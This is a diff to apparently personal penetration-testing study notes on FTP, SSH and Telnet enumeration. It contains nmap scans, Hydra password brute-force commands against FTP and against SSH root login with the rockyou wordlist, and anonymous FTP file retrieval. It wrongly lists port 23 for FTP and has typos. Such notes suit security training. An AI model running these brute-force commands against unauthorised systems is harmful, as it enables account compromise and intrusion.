@@ -1,9 +1,11 @@
 Enumeration
 FTP enumeration:
 nmap -sS -A -T4 subnet( to check if a host has open port 23 and allows anonymous login)
-Hydra -l username –p password ftp://IP ….we use small l if we know the user and we use capital L if we don’t know the user-
+Hydra -l username –p password ftp://IP -v ….we use small l if we know the user and we use capital L if we don’t know the user-
 ->ftp Ip
+ pwd (to check if we are root, if it shows something like / or /home/ftp, that’s the FTP root)
 ftp>get file.txt
+use cat to read the file in the current dierctory
 #SSH and Telnet Enumeration
 nmap -sV -p- subnet
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.X
